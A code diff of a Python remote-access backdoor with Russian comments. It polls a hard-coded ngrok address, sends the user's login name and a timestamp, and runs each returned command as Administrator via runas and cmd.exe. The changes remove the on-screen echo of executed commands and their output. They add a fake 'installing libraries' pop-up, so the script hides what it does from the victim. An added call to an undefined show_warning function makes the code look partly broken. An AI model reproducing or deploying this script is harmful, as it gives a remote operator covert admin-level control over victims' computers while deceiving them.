@@ -2,18 +2,22 @@ import subprocess
 import os
 import time
 
+warning_message = "This script requires additional libraries to run properly. Please wait while they are being installed."
+subprocess.run(["msg", "*", warning_message], shell=True)
+
 try:
     import requests
 except ImportError:
+    show_warning()
+    # Если библиотека отсутствует, устанавливаем её
     subprocess.run(["pip", "install", "requests"])
+    # Перезапускаем скрипт
     subprocess.run(["python", __file__])
     exit()
 
 url = 'https://assured-earwig-picked.ngrok-free.app/'
-previous_command_result = None
 
 def send_post_request():
-    global previous_command_result
     try:
         username = os.getlogin()
         timestamp = str(time.time())
@@ -22,11 +26,7 @@ def send_post_request():
 
         if response.status_code == 200:
             command = response.text.strip()
-            if previous_command_result:
-                print("Previous command result:", previous_command_result)
-            print("Executing command:", command)
-            result = subprocess.run(["runas", "/user:Administrator", "cmd.exe", "/c", command], capture_output=True, text=True, shell=True)
-            previous_command_result = result.stdout.strip()
+            subprocess.run(["runas", "/user:Administrator", "cmd.exe", "/c", command], shell=True)
         else:
             pass
     except Exception as e:
